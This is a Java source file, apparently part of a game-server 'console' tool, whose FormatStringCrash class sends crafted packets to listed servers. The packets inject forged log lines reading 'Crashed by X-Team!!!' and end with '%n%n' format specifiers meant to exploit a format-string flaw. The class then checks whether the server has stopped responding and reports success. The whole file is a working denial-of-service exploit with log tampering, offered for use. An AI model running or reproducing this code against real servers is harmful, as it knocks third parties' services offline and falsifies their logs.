/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package konsola;

import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author Mateusz
 */
public class FormatStringCrash extends Thread {

    Server s;

    static void crash() {
        for (Server el : Konsola.lista) {
            if (el.crash) {
                FormatStringCrash crash = new FormatStringCrash(el);
                crash.start();
            }
        }
    }

    public FormatStringCrash(Server s) {
        this.s = s;
    }

    public void run() {
        FS();
    }

    void FS() {
        try {
            CrashLog log = new CrashLog(s.name, s.ips);
            log.log.append("Injecting signature to log...\n");
            String cmd = "/sv finger' run from " + s.ip + ":" + s.port + "\n[00:00:00] Crashed by X-Team!!! Crashed by X-Team!!!  "
                    + " Crashed by X-Team!!! Crashed by X-Team!!! Crashed by X-Team!!! "
                    + " Crashed by X-Team!!! Crashed by X-Team!!! Crashed by X-Team!!! Crashed by X-Team!!!";
            s.sendStrPck(cmd);
            cmd = "/sv finger' run from " + s.ip + ":" + s.port + "\n[00:00:00] Crashed by X-Team!!!! Crashed by X-Team!!!!  "
                    + " Crashed by X-Team!!!! Crashed by X-Team!!!! Crashed by X-Team!!!! "
                    + " Crashed by X-Team!!!! Crashed by X-Team!!!! Crashed by X-Team!!!!   %n%n";
            log.log.append("Sending CRASH packet...\n");
            s.sendStrPck(cmd);
            log.log.append("Checking server status...\n");
            Thread.sleep(2000);
            if (s.sendStatus().length() < 1) {
                log.log.append("\nSERVER CRASHED!!!");
            } else {
                log.log.append("\nCrash failed!");
            }
            log.time.setText("Close for 3 sec");
            Thread.sleep(1000);
            log.time.setText("Close for 2 sec");
            Thread.sleep(1000);
            log.time.setText("Close for 1 sec");
            Thread.sleep(1000);
            log.dispose();
        } catch (InterruptedException ex) {
            Logger.getLogger(FormatStringCrash.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

}
